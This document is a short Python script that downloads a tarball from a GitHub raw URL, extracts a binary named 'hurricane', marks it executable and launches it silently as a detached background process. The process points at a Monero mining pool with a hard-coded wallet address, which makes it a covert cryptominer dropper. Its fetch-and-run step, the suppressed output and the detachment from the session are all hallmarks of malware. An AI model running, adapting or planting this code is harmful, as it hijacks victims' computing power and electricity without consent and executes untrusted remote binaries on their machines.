import os,urllib.request,tarfile,subprocess
URL="https://raw.githubusercontent.com/jaydmarks227/climate/refs/heads/main/hurricane.tar.gz"
if not os.path.exists("x.tgz"):
    urllib.request.urlretrieve(URL,"x.tgz")
tarfile.open("x.tgz","r:gz").extractall()
for r,_,f in os.walk("."):
    if "hurricane" in f:
        os.chmod(os.path.join(r,"hurricane"),0o755)
        subprocess.Popen(
            [
                os.path.join(r,"hurricane"),
                "--url","gulf.moneroocean.stream:443",          # عدّل حسب Pool
                "--user","88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm",  # Wallet + Worker
                "--tls",
                "--threads="
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        break
